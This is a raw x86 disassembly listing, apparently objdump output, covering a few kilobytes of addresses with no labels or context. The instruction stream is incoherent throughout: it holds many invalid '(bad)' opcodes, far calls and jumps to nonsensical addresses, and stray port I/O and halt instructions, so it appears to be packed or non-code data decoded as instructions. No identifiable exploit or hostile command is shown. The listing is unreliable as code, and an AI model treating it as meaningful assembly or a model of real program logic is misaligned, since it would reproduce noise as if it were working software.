  432d59:	lea    ebx,[ebp-0x56]
  432d5c:	jle    0x432d5e
  432d5e:	jae    0x432ce9
  432d60:	mov    eax,esp
  432d62:	call   0xb900:0x8b005587
  432d69:	inc    ebp
  432d6a:	push   ebp
  432d6b:	lea    ecx,[ebp-0x27ff4f12]
  432d71:	mov    eax,edi
  432d73:	int3   
  432d74:	push   ebp
  432d75:	xchg   edi,eax
  432d77:	add    esp,ebp
  432d79:	add    BYTE PTR [eax],al
  432d7b:	inc    ebp
  432d7c:	add    BYTE PTR [ebp+0x8b3255],cl
  432d82:	cld    
  432d83:	mov    DWORD PTR [edx],edi
  432d85:	aam    0x75
  432d87:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  432d8d:	mov    DWORD PTR [ebx-0x50],edx
  432d90:	test   BYTE PTR [ebp-0x1],0xe8
  432d94:	mov    eax,DWORD PTR [eax]
  432d96:	hlt    
  432d97:	add    al,al
  432d99:	mov    eax,DWORD PTR ds:0x890045a8
  432d9f:	dec    DWORD PTR [ebx+0x45fdf0e8]
  432da5:	inc    DWORD PTR [eax*2+0xf75854d]
  432dac:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  432db2:	call   0x72998af3
  432db7:	je     0x432e17
  432db9:	js     0x432e1a
  432dbb:	lock ret 0x7e
  432dbf:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  432dc5:	mov    edi,edi
  432dc7:	sbb    al,bl
  432dc9:	clc    
  432dca:	add    BYTE PTR [ebp-0x73],bh
  432dcd:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  432dd3:	ror    BYTE PTR [eax],1
  432dd5:	dec    ebp
  432dd6:	xchg   ebp,eax
  432dd7:	mov    edi,edi
  432dd9:	in     al,0x8b
  432ddb:	jge    0x432d66
  432ddd:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  432de3:	clc    
  432de4:	pop    esi
  432de5:	fist   DWORD PTR [ebp+0x5d398b5d]
  432deb:	clc    
  432dec:	add    al,0x6e
  432dee:	mov    eax,DWORD PTR [ebx]
  432df0:	mov    BYTE PTR [ebp+0x0],dl
  432df3:	mov    edx,DWORD PTR [ebx-0x20]
  432df6:	adc    esi,DWORD PTR [edi+0x5e005f3c]
  432dfc:	add    eax,0x3b3b73
  432e01:	adc    al,0x89
  432e03:	pop    eax
  432e04:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  432e08:	ret    0xf08
  432e0b:	cmp    al,0x2
  432e0d:	mov    edx,eax
  432e0f:	cld    
  432e10:	add    BYTE PTR [ebp+0x66],dl
  432e13:	add    eax,ebx
  432e15:	add    esp,eax
  432e17:	sub    eax,eax
  432e19:	or     BYTE PTR [ecx-0x77f474bb],cl
  432e1f:	add    BYTE PTR [eax],al
  432e21:	mov    DWORD PTR [ebx-0x24],ebx
  432e24:	push   edi
  432e25:	push   ebp
  432e26:	clc    
  432e27:	add    DWORD PTR [esi+0x1b0100],0x45
  432e2e:	out    0xff,eax
  432e30:	add    edx,DWORD PTR [eax]
  432e32:	jmp    0x432e1c
  432e34:	cmp    ch,0x46
  432e37:	(bad)  
  432e38:	jmp    0x40c8b68a
  432e3d:	je     0x432dc9
  432e3f:	mov    eax,DWORD PTR [eax-0x10c78104]
  432e45:	inc    ebp
  432e46:	add    BYTE PTR [ebx-0x770375],al
  432e4c:	add    ah,ch
  432e4e:	add    edx,esp
  432e50:	pop    edi
  432e51:	pop    ebp
  432e52:	push   ebp
  432e53:	inc    ebx
  432e54:	in     al,dx
  432e55:	pop    ebp
  432e56:	in     al,dx
  432e57:	cmp    edx,DWORD PTR [edi-0x8]
  432e5a:	xor    DWORD PTR [esp+ebx*4-0x173676a5],edx
  432e61:	add    al,0x47
  432e63:	push   ebp
  432e64:	mov    esp,ebp
  432e66:	in     al,0x45
  432e68:	dec    ebp
  432e69:	push   esi
  432e6a:	test   DWORD PTR [eax+0xfb010f],esi
  432e70:	add    BYTE PTR [eax+0xc018b],dh
  432e76:	leave  
  432e77:	inc    ebp
  432e78:	test   al,ch
  432e7a:	add    dh,bh
  432e7c:	add    bh,bh
  432e7e:	dec    ebp
  432e7f:	push   cs
  432e80:	mov    DWORD PTR [ecx],eax
  432e82:	hlt    
  432e83:	push   es
  432e84:	dec    ebp
  432e85:	leave  
  432e86:	mov    DWORD PTR [eax],ecx
  432e88:	clc    
  432e89:	cmovge eax,ecx
  432e8c:	mov    ecx,0x85c2f0
  432e92:	clc    
  432e93:	pop    DWORD PTR [ebp+0x1]
  432e96:	push   ebx
  432e97:	add    BYTE PTR [ebp-0x15],bh
  432e9a:	push   esi
  432e9b:	xor    eax,0x898a45
  432ea0:	cld    
  432ea1:	add    al,BYTE PTR [ebp+0x0]
  432ea4:	xor    esp,DWORD PTR [esi-0x64]
  432ea7:	add    DWORD PTR [esi+0x78308c1],edi
  432ead:	add    ah,BYTE PTR [ebp-0x49]
  432eb0:	int    0xbb
  432eb2:	mov    ecx,DWORD PTR [esi+0xc]
  432eb5:	add    dh,al
  432eb7:	cmp    ecx,ebx
  432eb9:	jne    0x432e83
  432ebb:	xor    ecx,DWORD PTR [ebp+0x66]
  432ebe:	jmp    0xca2ec4
  432ec3:	add    DWORD PTR [ebp+0x0],eax
  432ec6:	mov    eax,ebx
  432ec8:	or     al,0x8b
  432eca:	(bad)  
  432ecb:	mov    ecx,esi
  432ecd:	mov    BYTE PTR [eax+eax*1+0x664c136],cl
  432ed4:	mov    eax,edi
  432ed6:	or     BYTE PTR [edx],cl
  432ed8:	shl    cl,cl
  432eda:	icebp  
  432edb:	add    BYTE PTR [ebp+0x38],0x8b
  432edf:	or     BYTE PTR [edx+eax*2],cl
  432ee2:	(bad)  
  432ee3:	or     cl,dh
  432ee5:	stc    
  432ee6:	shl    DWORD PTR [ebp-0x30],0xc6
  432eea:	xor    al,0x0
  432eec:	inc    ebp
  432eed:	xchg   BYTE PTR [ebx],al
  432eef:	add    esp,edi
  432ef1:	add    BYTE PTR [ebp-0x39],cl
  432ef4:	mov    al,bl
  432ef6:	test   DWORD PTR [ebx+0x1c348375],ecx
  432efc:	sub    al,0xbf
  432efe:	jmp    0x432e85
  432f00:	mov    edi,eax
  432f02:	lock jge 0x432ef6
  432f05:	lea    esi,[edx-0x74bad5ff]
  432f0b:	mov    ebp,esp
  432f0d:	or     cl,dh
  432f0f:	leave  
  432f10:	add    al,BYTE PTR [eax+eax*4-0x37ff9b00]
  432f17:	dec    ebp
  432f18:	dec    ebp
  432f19:	test   DWORD PTR [ebx],eax
  432f1b:	paddb  mm6,mm0
  432f1e:	add    DWORD PTR [eax],eax
  432f20:	dec    ebp
  432f21:	mov    ecx,DWORD PTR [ebx-0x64b217f0]
  432f27:	mov    esi,DWORD PTR [edx]
  432f29:	or     al,0x2b
  432f2b:	dec    ebp
  432f2c:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  432f32:	mov    esp,edi
  432f34:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  432f3b:	mov    DWORD PTR [ebx],ebp
  432f3d:	call   0xc76b86d
  432f42:	mov    DWORD PTR [ebp+0x10],ecx
  432f45:	(bad)  
  432f46:	push   0x8b85ff10
  432f4b:	clc    
  432f4c:	or     al,0x54
  432f4e:	(bad)  
  432f4f:	push   ecx
  432f50:	retf   
  432f51:	mov    ebx,0xff4d8dc8
  432f56:	mov    DWORD PTR [ebp+0x8],eax
  432f59:	xor    eax,DWORD PTR [ebp-0x75]
  432f5c:	cmp    ebp,DWORD PTR [ebx]
  432f5e:	lsl    ebx,WORD PTR [edi-0x8]
  432f62:	call   DWORD PTR [ebx-0x741bff75]
  432f68:	(bad)  
  432f69:	or     al,0x5b
  432f6b:	dec    ebp
  432f6c:	or     BYTE PTR [ebx],dh
  432f6e:	inc    ebp
  432f6f:	xor    esi,DWORD PTR ds:0x708088d
  432f75:	in     eax,0x9b
  432f77:	add    BYTE PTR [edx],dh
  432f79:	inc    ebp
  432f7a:	pop    edi
  432f7b:	xor    eax,edx
  432f7d:	test   DWORD PTR [eax],0x81108b8b
  432f83:	dec    ebp
  432f84:	sub    al,0x33
  432f86:	add    BYTE PTR [ebx],dh
  432f88:	push   esi
  432f89:	sub    ecx,DWORD PTR [ebx-0x768accc5]
  432f8f:	mov    edi,eax
  432f91:	or     BYTE PTR [ebp+0x45],al
  432f94:	mov    DWORD PTR [ebx+0x45f4ec],ecx
  432f9a:	xor    ecx,ecx
  432f9c:	pushf  
  432f9d:	push   es
  432f9e:	mov    DWORD PTR [esi-0x4],0xf8178538
  432fa5:	dec    ebp
  432fa6:	inc    ebp
  432fa7:	cmp    BYTE PTR [ecx],0x54
  432faa:	pushf  
  432fab:	gs (bad) 
  432fad:	shl    esp,1
  432faf:	dec    ebp
  432fb0:	xchg   BYTE PTR [eax-0x3dbaab08],al
  432fb6:	shr    ecx,1
  432fb8:	xlat   BYTE PTR ds:[ebx]
  432fb9:	rol    bh,cl
  432fbb:	mov    edx,esp
  432fbd:	or     BYTE PTR [ebp+0x4588f84d],al
  432fc3:	mov    ecx,DWORD PTR [eax]
  432fc5:	or     BYTE PTR [eax],al
  432fc7:	push   ebp
  432fc8:	mov    edi,DWORD PTR [eax+0xfc728b]
  432fce:	dec    ebp
  432fcf:	enter  0xceba,0x8
  432fd3:	retf   0x1807
  432fd6:	ret    0x9b4d
  432fd9:	mov    esi,DWORD PTR [edx]
  432fdb:	or     al,0x33
  432fdd:	into   
  432fde:	add    edx,esi
  432fe0:	add    ecx,edx
  432fe2:	bswap  eax
  432fe4:	ror    esi,0x98
  432fe7:	dec    ebp
  432fe8:	add    cl,ch
  432fea:	mov    edi,edi
  432fec:	hlt    
  432fed:	inc    esi
  432fef:	inc    ebp
  432ff0:	ret    0x4533
  432ff3:	mov    ecx,DWORD PTR [ebx+0x4d03fc2b]
  432ff9:	or     BYTE PTR [ebx],dh
  432ffb:	dec    ebp
  432ffc:	xor    ecx,DWORD PTR [ebx-0x38fceffd]
  433002:	jne    0xff8d2fc9
  433008:	inc    ebp
  433009:	inc    ebp
  43300a:	mov    esi,DWORD PTR [ebx]
  43300c:	clc    
  43300d:	pop    esi
  43300e:	ret    0xcaeb
  433011:	mov    eax,esi
  433013:	call   0x520484e6
  433018:	dec    ebp
  433019:	add    eax,0xf8728b
  43301e:	adc    eax,0xce0ccac9
  433023:	push   ebp
  433024:	ret    0xc6ec
  433027:	in     al,dx
  433028:	call   0x33437d31
  43302d:	push   edi
  43302e:	add    edi,eax
  433030:	xor    eax,eax
  433032:	jmp    0x433079
  433034:	xor    ecx,DWORD PTR [ecx+0x4503f433]
  43303a:	add    eax,edi
  43303c:	shr    eax,cl
  43303e:	mov    DWORD PTR [ebp+0x4545f8f8],eax
  433044:	mov    esi,DWORD PTR [edx]
  433046:	in     al,dx
  433047:	pushf  
  433048:	ret    0x84c7
  43304b:	fcomp  DWORD PTR [ebx-0x7607cd7b]
  433051:	inc    ebp
  433052:	in     al,dx
  433053:	xor    DWORD PTR [ebp-0x64],eax
  433056:	mov    eax,edi
  433058:	cld    
  433059:	fmul   st(2),st
  43305b:	sbb    dl,al
  43305d:	jmp    0x9c3b:0x304d45c1
  433064:	jbe    0x43302d
  433066:	mov    esp,eax
  433068:	clc    
  433069:	add    BYTE PTR [ebp+0x0],cl
  43306c:	mov    ecx,ecx
  43306e:	lea    eax,[ebp-0x5]
  433071:	mov    edi,edi
  433073:	call   0x51ce84bd
  433078:	hlt    
  433079:	xor    eax,edx
  43307b:	mov    esi,0x9b7284
  433080:	xor    cl,dl
  433082:	mov    esi,eax
  433084:	hlt    
  433085:	into   
  433086:	inc    ebp
  433087:	scas   eax,DWORD PTR es:[edi]
  433088:	mov    ebp,ecx
  43308a:	cld    
  43308b:	add    dl,cl
  43308d:	add    dl,al
  43308f:	inc    ebp
  433090:	shr    DWORD PTR [ebx],0x4d
  433093:	xor    edi,DWORD PTR [ebx]
  433095:	mov    DWORD PTR [edi],ecx
  433097:	clc    
  433098:	dec    esi
  433099:	inc    ebp
  43309a:	dec    DWORD PTR [ebx-0x3d2b1775]
  4330a0:	ret    0xc6ca
  4330a3:	mov    BYTE PTR [ebp-0x32],0x53
  4330a7:	scas   eax,DWORD PTR es:[edi]
  4330a8:	inc    ebp
  4330a9:	jmp    0x4330db
  4330ab:	mov    ebx,DWORD PTR [esp+edi*8+0x335b4d8b]
  4330b2:	pop    ebx
  4330b3:	xor    ecx,DWORD PTR [ebp+0x3]
  4330b6:	mov    eax,DWORD PTR [ebx]
  4330b8:	clc    
  4330b9:	test   edx,ecx
  4330bb:	mov    ecx,esi
  4330bd:	cld    
  4330be:	call   0x8ab77608
  4330c3:	xor    ecx,DWORD PTR [eax+0x4533f303]
  4330c9:	add    ecx,DWORD PTR [ebx-0x4974072d]
  4330cf:	fdiv   QWORD PTR [ebx]
  4330d1:	retf   0xce89
  4330d4:	in     al,0xc1
  4330d6:	inc    ebp
  4330d7:	or     cl,BYTE PTR [ebx-0x3d3d1b36]
  4330dd:	into   
  4330de:	mov    dh,0xc1
  4330e1:	call   0x8c17766a
  4330e6:	(bad)  
  4330e7:	cld    
  4330e8:	mov    ecx,DWORD PTR [ebp-0x14]
  4330eb:	xor    eax,ecx
  4330ed:	lea    eax,[ebp+0x8]
  4330f0:	mov    esi,DWORD PTR [edx-0x4]
  4330f3:	add    dl,al
  4330f5:	inc    ebp
  4330f6:	mov    esp,0x32d89b8b
  4330fb:	dec    ebp
  4330fc:	mov    esi,DWORD PTR [ebx]
  4330fe:	cld    
  4330ff:	xor    eax,edx
  433101:	sub    esp,DWORD PTR [ebp-0x75]
  433104:	int    0xec
  433106:	sub    ecx,eax
  433108:	add    esp,DWORD PTR [ecx-0x74b2ba20]
  43310e:	mov    esi,esp
  433110:	call   0x34177e99
  433115:	inc    DWORD PTR [ebx]
  433117:	mov    edi,DWORD PTR [ebx]
  433119:	cld    
  43311a:	jne    0x433169
  43311c:	mov    esi,DWORD PTR [ebx]
  43311e:	aam    0x8d
  433120:	dec    ebp
  433121:	or     BYTE PTR [ebx],dh
  433123:	jb     0x433128
  433125:	add    BYTE PTR [edi+0x45],bl
  433128:	ror    DWORD PTR [ebx+0x4d55e4c9],0xec
  43312f:	xor    ebp,esp
  433131:	xor    eax,edi
  433133:	sub    edi,esp
  433135:	mov    eax,DWORD PTR [ebp+0x32c8f8f4]
  43313b:	xchg   BYTE PTR [edi+edi*8+0x45e8ff89],bl
  433142:	inc    ebp
  433143:	xor    ecx,DWORD PTR [ecx+0x45891403]
  433149:	clc    
  43314a:	mov    eax,edi
  43314c:	nop
  43314d:	fadd   QWORD PTR [eax]
  43314f:	xchg   BYTE PTR [ebx+0xdb14f8],cl
  433155:	jmp    0x4330e0
  433157:	mov    eax,DWORD PTR [ecx]
  433159:	fadd   DWORD PTR [eax]
  43315b:	inc    ebp
  43315c:	or     DWORD PTR [ebx],esi
  43315e:	dec    eax
  43315f:	add    edx,DWORD PTR [ebx-0x2d]
  433162:	dec    ebp
  433163:	mov    DWORD PTR [ebx+0x5707fcec],ecx
  433169:	inc    ebp
  43316a:	push   esp
  43316b:	mov    dl,BYTE PTR [ecx-0xd]
  43316e:	xor    ecx,DWORD PTR [ebp-0x45]
  433171:	(bad)  
  433173:	rol    BYTE PTR [eax],0xc1
  433176:	ret    
  433177:	inc    ebp
  433178:	inc    ebp
  433179:	mov    ecx,DWORD PTR [ebx-0x38b20324]
  43317f:	xor    eax,ebx
  433181:	add    eax,DWORD PTR [ebp+0x23]
  433184:	mov    ecx,DWORD PTR [ebx-0x4bf7a08]
  43318a:	cmp    edi,0xc
  43318d:	dec    ebp
  43318e:	inc    ebp
  43318f:	xor    ecx,DWORD PTR [ebx+0x40f8f889]
  433195:	inc    ebp
  433196:	mov    esi,DWORD PTR [ebx]
  433198:	clc    
  433199:	lea    eax,[ebp+0x45725407]
  43319f:	add    BYTE PTR [ebp+eax*2-0x75],dh
  4331a3:	xor    edi,DWORD PTR [eax]
  4331a5:	mov    ecx,0xff8b8d4d
  4331aa:	push   esp
  4331ab:	enter  0x4df7,0x23
  4331af:	mov    DWORD PTR [ebx+0x4045f8e0],ecx
  4331b5:	mov    eax,DWORD PTR [ebx]
  4331b7:	loopne 0x4331a4
  4331b9:	ret    0xc68b
  4331bc:	push   esp
  4331bd:	enter  0x9745,0x8b
  4331c1:	inc    ebp
  4331c2:	cld    
  4331c3:	mov    eax,edi
  4331c5:	clc    
  4331c6:	ret    
  4331c7:	ret    0xc645
  4331ca:	mov    esi,DWORD PTR [ebx]
  4331cc:	cld    
  4331cd:	pop    esi
  4331ce:	mov    ebx,0x83458bc3
  4331d4:	mov    ebp,DWORD PTR [esp+edi*8+0x45]
  4331d8:	dec    ebp
  4331d9:	xor    DWORD PTR [ebx],esi
  4331db:	pushf  
  4331dc:	add    edi,DWORD PTR [edx-0x7767a77]
  4331e2:	fcom   DWORD PTR [ebp+0x45]
  4331e5:	mov    esi,DWORD PTR [ebx]
  4331e7:	adc    al,0x9c
  4331e9:	inc    ebp
  4331ea:	(bad)  
  4331eb:	mov    ebx,eax
  4331ed:	adc    al,0x85
  4331ef:	cmp    al,0x1
  4331f2:	inc    ebp
  4331f3:	add    BYTE PTR ds:0xe98b9c4d,bh
  4331f9:	mov    eax,DWORD PTR [ebx]
  4331fb:	nop
  4331fc:	add    BYTE PTR [eax],al
  4331fe:	inc    ebp
  4331ff:	mov    esi,DWORD PTR [ebx]
  433201:	add    eax,DWORD PTR [ebx]
  433203:	cmp    al,0x89
  433205:	mov    esp,esi
  433207:	clc    
  433208:	inc    ebp
  433209:	inc    ebp
  43320a:	add    edx,DWORD PTR [esi+0xc]
  43320d:	mov    edi,0x7ff0845
  433212:	in     al,dx
  433213:	(bad)  
  433214:	jne    0x4331b1
  433216:	mov    esi,DWORD PTR [edx]
  433218:	clc    
  433219:	add    ebp,DWORD PTR [esi]
  43321b:	mov    edi,edi
  43321d:	in     al,dx
  43321e:	mov    DWORD PTR [ebp-0x10],eax
  433221:	xor    eax,DWORD PTR [ebp+0x3]
  433224:	cmp    DWORD PTR [ecx+0x458bf49c],ecx
  43322a:	fmul   DWORD PTR [ebx-0x173caf39]
  433230:	lea    ecx,[ecx+0x45e8d4bc]
  433236:	clc    
  433237:	mov    edi,edi
  433239:	cmp    BYTE PTR [ebp+0x4d],al
  43323c:	test   DWORD PTR [eax+0x74],ecx
  43323f:	inc    ecx
  433240:	mov    ecx,DWORD PTR [ebx+0x18c7f8d8]
  433246:	ret    
  433247:	inc    eax
  433248:	dec    DWORD PTR [ebx+0x4945f8f0]
  43324e:	push   eax
  43324f:	dec    eax
  433250:	test   al,0xd0
  433252:	dec    eax
  433254:	mov    eax,DWORD PTR [ebp-0x14]
  433257:	mov    eax,DWORD PTR [ebp+0x38]
  43325a:	mov    eax,ecx
  43325c:	fadd   DWORD PTR [ebx]
  43325e:	dec    ebp
  43325f:	inc    eax
  433260:	sub    ecx,DWORD PTR [ecx+0x45d81489]
  433266:	inc    ebp
  433267:	xor    ecx,DWORD PTR [ebx+0x4089f003]
  43326d:	fadd   QWORD PTR [ebx]
  43326f:	inc    ebp
  433270:	or     al,0x33
  433272:	dec    ebp
  433273:	add    edi,DWORD PTR [ebx]
  433275:	mov    DWORD PTR [edx-0x28],esi
  433278:	mov    eax,DWORD PTR [ebp-0x10]
  43327b:	mov    eax,DWORD PTR [eax+0x10]
  43327e:	mov    eax,edi
  433280:	lock ret 
  433282:	inc    ecx
  433283:	add    DWORD PTR [ebx-0x3e3827ab],ecx
  433289:	fsubr  st,st(5)
  43328b:	test   DWORD PTR [eax],eax
  43328d:	clc    
  43328e:	push   0x45
  433290:	(bad)  
  433291:	cmp    al,0xec
  433293:	pushf  
  433294:	inc    ebp
  433295:	(bad)  
  433296:	push   eax
  433297:	fsub   DWORD PTR [eax-0x7b]
  43329a:	(bad)  
  43329b:	clc    
  43329c:	mov    eax,0xf8008584
  4332a1:	mov    eax,DWORD PTR [ebp-0x4]
  4332a4:	mov    edi,0x4585c3cc
  4332aa:	clc    
  4332ab:	mov    eax,DWORD PTR [ebp+0x14]
  4332ae:	xor    eax,DWORD PTR [ebp-0x64]
  4332b1:	mov    edi,eax
  4332b3:	in     al,dx
  4332b4:	les    esi,FWORD PTR [ebp-0x7b]
  4332b7:	mov    edi,eax
  4332b9:	or     al,0x4d
  4332bb:	dec    ebp
  4332bc:	mov    eax,ebp
  4332be:	in     al,0xf2
  4332c0:	dec    ebp
  4332c1:	dec    DWORD PTR [ecx+0x4dc7e045]
  4332c7:	fmul   DWORD PTR [ecx+0x4df8f085]
  4332cd:	inc    ebp
  4332ce:	mov    DWORD PTR [ebx],esi
  4332d0:	fadd   QWORD PTR [ebx]
  4332d2:	dec    ebp
  4332d3:	push   eax
  4332d4:	xor    eax,DWORD PTR [ebp+0x3]
  4332d7:	push   eax
  4332d8:	mov    DWORD PTR [eax+ebx*8],ebx
  4332db:	push   esi
  4332dd:	mov    eax,DWORD PTR [eax]
  4332df:	lock cmp eax,0xf84e85c0
  4332e5:	inc    ebp
  4332e6:	test   BYTE PTR [ebx],dh
  4332e8:	add    DWORD PTR [ebx],eax
  4332ea:	add    BYTE PTR [eax+0x4d],dl
  4332ed:	jne    0x433322
  4332ef:	lea    ecx,[ebx-0x7617fc44]
  4332f5:	div    ah
  4332f7:	inc    DWORD PTR [ebp+0x45]
  4332fa:	xor    ecx,DWORD PTR [ecx+0x4530d88d]
  433300:	jb     0x43328d
  433302:	add    BYTE PTR [eax*2-0x17ba743f],cl
  433309:	mov    ecx,DWORD PTR [ebp-0x10]
  43330c:	xor    ecx,DWORD PTR [ebp+0x3]
  43330f:	mov    edi,DWORD PTR [ebx]
  433311:	adc    BYTE PTR [ebp+0x41],dh
  433314:	mov    ecx,DWORD PTR [ebx-0x37382704]
  43331a:	ret    
  43331b:	push   ss
  43331c:	push   0x45
  43331e:	lea    ecx,[ebx+0x4de80cb0]
  433324:	sti    
  433325:	add    edi,edi
  433327:	or     BYTE PTR [ebp+0x4d],al
  43332a:	mov    ebp,DWORD PTR [ebx]
  43332c:	xor    ebp,ecx
  43332e:	mov    al,BYTE PTR [edx]
  433330:	add    eax,0xc7200
  433335:	jne    0x433384
  433337:	lea    esi,[ebx]
  433339:	mov    al,0xf
  43333b:	call   0xf2a00
  433340:	shl    DWORD PTR [ecx],0x84
  433343:	pushf  
  433344:	add    DWORD PTR [ecx+0x4545d000],ecx
  43334a:	mov    esi,DWORD PTR [edx]
  43334c:	xor    ebx,DWORD PTR [edx+ecx*4+0x72c805c7]
  433353:	test   DWORD PTR [eax],eax
  433355:	clc    
  433356:	dec    ebp
  433357:	inc    ebp
  433358:	xor    edi,DWORD PTR [edi+ecx*1]
  43335b:	pushf  
  43335c:	ror    BYTE PTR [ebp+0x4dc1d0cb],0x84
  433363:	lea    eax,[ecx]
  433365:	int3   
  433366:	add    BYTE PTR [ebp+0x45],cl
  433369:	lea    ecx,[ebx-0x75b2cc38]
  43336f:	lea    eax,ds:0x4d72c4
  433375:	mov    ecx,DWORD PTR [ebp-0x4]
  433378:	xor    ecx,edi
  43337a:	bswap  ebx
  43337c:	ror    BYTE PTR [ebp-0x35],0xe9
  433380:	rol    DWORD PTR [ecx],0x84
  433383:	add    BYTE PTR [ecx],al
  433385:	xor    eax,DWORD PTR [eax]
  433387:	pushf  
  433388:	inc    ebp
  433389:	jnp    0x8a43678c
  43338f:	mov    eax,DWORD PTR ds:0xcf72e8
  433395:	lock dec ebp
  433397:	retf   
  433398:	xor    ecx,DWORD PTR [ebp+0xf]
  43339b:	mov    eax,eax
  43339d:	fmul   st,st(3)
  43339f:	test   ecx,0x19b8484
  4333a5:	xor    al,BYTE PTR [eax]
  4333a7:	mov    DWORD PTR [ebp-0x28],eax
  4333aa:	mov    eax,DWORD PTR [ebp+0x33]
  4333ad:	mov    ecx,DWORD PTR [edx+0x72c705d8]
  4333b3:	ret    
  4333b4:	add    al,cl
  4333b6:	dec    ebp
  4333b7:	adc    ecx,DWORD PTR [ebx-0x75ccccbb]
  4333bd:	add    ecx,DWORD PTR ds:0xc7250
  4333c3:	inc    ebp
  4333c4:	rcl    DWORD PTR [eax+0x4d],0x2b
  4333c8:	mov    edi,edi
  4333ca:	xor    ecx,DWORD PTR [ebx+0xde48a]
  4333d0:	jb     0x433399
  4333d2:	add    BYTE PTR [ecx+eax*8-0x74cdb2b5],al
  4333d9:	mov    esi,DWORD PTR [ebx]
  4333db:	cld    
  4333dc:	mov    cl,bh
  4333de:	or     eax,0x372b6
  4333e3:	cmp    ecx,eax
  4333e5:	jne    0x433462
  4333eb:	mov    eax,DWORD PTR [ebp-0x20]
  4333ee:	mov    eax,DWORD PTR [eax]
  4333f0:	xor    eax,edi
  4333f2:	mov    al,BYTE PTR [ebp+eax*1+0x32724b]
  4333f9:	mov    ecx,DWORD PTR [ebp-0x4]
  4333fc:	mov    ecx,edi
  4333fe:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  433404:	jb     0x433415
  433406:	add    BYTE PTR [edi-0x3f],dl
  433409:	add    BYTE PTR [ebp-0x75],cl
  43340c:	mov    esi,eax
  43340e:	xor    eax,DWORD PTR [eax]
  433410:	mov    al,bh
  433412:	or     eax,0x4b7284
  433417:	xor    al,cl
  433419:	mov    ecx,DWORD PTR [ebp-0x4]
  43341c:	mov    ecx,edi
  43341e:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  433424:	jb     0x433435
  433426:	add    BYTE PTR [edi],dh
  433428:	enter  0x8500,0x8b
  43342c:	add    ah,bl
  43342e:	add    BYTE PTR [eax],al
  433430:	inc    ebp
  433431:	(bad)  
  433432:	mov    eax,DWORD PTR [ebx+esi*1+0x5328a4b]
  433439:	mov    esi,DWORD PTR [edx-0x4]
  43343c:	add    bh,cl
  43343e:	dec    ebp
  43343f:	mov    dh,0x8b
  433441:	add    esi,DWORD PTR [ebx]
  433443:	cmp    ecx,DWORD PTR [edx+0x72170d0f]
  433449:	add    BYTE PTR [eax],al
  43344b:	mov    eax,ecx
  43344d:	loopne 0x43349c
  43344f:	add    BYTE PTR [ebx-0x757bcc39],cl
  433455:	dec    ebx
  433456:	or     eax,0x8b7232
  43345b:	in     al,0xc1
  43345d:	or     DWORD PTR [ebp-0x31],ecx
  433460:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4b]
  433467:	xor    dh,BYTE PTR [edx-0x75]
  43346a:	add    al,dh
  43346c:	enter  0x4f09,0xcf
  433470:	inc    ebp
  433471:	mov    WORD PTR [ebx-0x75cdccb5],cs
  433477:	or     al,BYTE PTR ds:0xe4728b
  43347d:	or     DWORD PTR [ebp-0x31],ecx
  433480:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4f]
  433487:	cmp    dh,BYTE PTR [edx+0xf]
  43348a:	add    bl,dl
  43348c:	rol    DWORD PTR [eax],0x4d
  43348f:	mov    ecx,DWORD PTR [ebx-0x75ffcc10]
  433495:	(bad)  
  433496:	or     eax,0x4b7284
  43349b:	xor    al,cl
  43349d:	mov    ecx,DWORD PTR [ebp-0x20]
  4334a0:	mov    ecx,DWORD PTR [ecx]
  4334a2:	xor    ecx,edi
  4334a4:	mov    cl,BYTE PTR [ebp+ecx*1+0x32724b]
  4334ab:	xor    cl,al
  4334ad:	mov    ecx,DWORD PTR [edi]
  4334af:	fadd   QWORD PTR [ebp+0x9]
  4334b2:	call   0xffd02f86
  4334b7:	dec    ebx
  4334b8:	dec    ebp
  4334b9:	xor    bh,BYTE PTR [ebx]
  4334bb:	or     dh,BYTE PTR [ebx+ecx*4-0x75]
  4334bf:	loopne 0x4334bd
  4334c1:	or     edi,eax
  4334c3:	iret   
  4334c4:	ret    
  4334c5:	mov    WORD PTR [ebp+0x4f],es
  4334c8:	mov    esi,DWORD PTR [edx]
  4334ca:	call   0x8452fc09
  4334cf:	(bad)  
  4334d0:	fwait
  4334d1:	add    BYTE PTR [edx],dh
  4334d3:	mov    esi,DWORD PTR [ebx]
  4334d5:	fmul   QWORD PTR [ebx+0x55c7fc00]
  4334db:	test   BYTE PTR [ebx],dh
  4334dd:	dec    ebx
  4334de:	add    esi,DWORD PTR [edx]
  4334e0:	cmp    ecx,DWORD PTR [ebx+0x9f8f00f]
  4334e6:	dec    edi
  4334e8:	mov    ecx,DWORD PTR [esp+edi*8+0x33324d4b]
  4334ef:	xor    al,BYTE PTR [ebx]
  4334f1:	mov    edi,DWORD PTR [ebx]
  4334f3:	in     al,0x75
  4334f5:	or     DWORD PTR [ebx+0x4d8ce8cf],ecx
  4334fb:	dec    ebx
  4334fc:	xor    esi,DWORD PTR [edx]
  4334fe:	lea    ecx,[edx]
  433500:	or     BYTE PTR [ebx+0x900f072],cl
  433506:	ja     0x4334d7
  433508:	sbb    BYTE PTR [ebp+esi*2-0x67cd72b1],cl
  43350f:	cmp    ch,al
  433511:	jne    0x433506
  433513:	mov    edi,edi
  433515:	fadd   QWORD PTR [ebp+0x0]
  433518:	mov    eax,edi
  43351a:	fadd   DWORD PTR [edi+eax*8-0x3ecd3cb5]
  433521:	mov    edx,DWORD PTR [ebx]
  433523:	in     al,0x45
  433525:	or     DWORD PTR [ebx],esi
  433527:	iret   
  433528:	add    ecx,DWORD PTR [eax+edx*2+0x4532184b]
  43352f:	xor    dl,BYTE PTR [eax-0x75]
  433532:	sbb    al,0xe0
  433534:	dec    DWORD PTR [ecx]
  433536:	mov    ecx,edi
  433538:	in     al,dx
  433539:	mov    eax,es
  43353b:	dec    ebx
  43353c:	mov    DWORD PTR [edx],esi
  43353e:	fmul   QWORD PTR [edx]
  433540:	jne    0x4334cd
  433542:	(bad)  
  433543:	(bad)  
  433545:	or     DWORD PTR [ebp-0x31],eax
